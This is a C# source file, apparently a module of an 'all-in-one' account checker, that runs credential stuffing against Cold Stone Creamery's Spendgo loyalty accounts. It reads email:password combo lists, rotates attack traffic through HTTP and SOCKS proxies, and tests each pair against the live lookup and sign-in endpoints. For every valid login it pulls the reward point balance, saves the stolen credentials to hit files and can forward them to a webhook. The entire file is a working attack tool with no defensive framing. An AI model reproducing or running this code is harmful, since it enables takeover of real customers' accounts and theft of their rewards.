using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class ColdStoneCreamerymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = "{\"email\":\"" + array[0] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/lookup", str,
                                "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("{\"status\":\"NotFound\"}"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("{\"status\":\"Activated\"}") ||
                                         strResponse.Contains("{\"status\":\"Found\"}")) //hit
                                {
                                    var str2 = "{\"value\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}";
                                    var strResponse2 = req.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/signin",
                                        str2, "application/json;charset=UTF-8").ToString();
                                    if (strResponse2.Contains("Member id /password incorrect"))
                                    {
                                        Program.TotalChecks++;
                                        Program.Fails++;
                                    }
                                    else if (strResponse2.Contains("username\":\""))
                                    {
                                        var ID = Parse(strResponse2, "spendgo_id\":\"", "\",\"");
                                        var postforcap = "{\"spendgo_id\":\"" + ID + "\"}";
                                        var cap = req
                                            .Post("https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers",
                                                postforcap, "application/json;charset=UTF-8").ToString();
                                        if (cap.Contains("point_total"))
                                        {
                                            try
                                            {
                                                var Points = Regex.Match(cap, "point_total\":(.*?),").Groups[1].Value;
                                                Program.Hits++;
                                                Program.TotalChecks++;
                                                if (Program.lorc == "LOG")
                                                    Settings.PrintHit("Coldstone", array[0] + ":" + array[1]);
                                                Export.AsResult("/Coldstone_hits",
                                                    array[0] + ":" + array[1] + " | Points: " + Points);
                                            }
                                            catch
                                            {
                                                Program.Hits++;
                                                Program.TotalChecks++;
                                                if (Program.lorc == "LOG")
                                                    Settings.PrintHit("Coldstone", array[0] + ":" + array[1]);
                                                Export.AsResult("/Coldstone_hits_cap_error", array[0] + ":" + array[1]);
                                                if (Settings.sendToWebhook)
                                                    Settings.sendTowebhook1(array[0] + ":" + array[1],
                                                        "Coldstone Hits");
                                            }
                                        }
                                        else
                                        {
                                            if (Program.lorc == "LOG")
                                                Settings.PrintFree("Coldstone", array[0] + ":" + array[1]);
                                            Export.AsResult("/Coldstone_frees", array[0] + ":" + array[1]);
                                            Program.Frees++;
                                            Program.TotalChecks++;
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}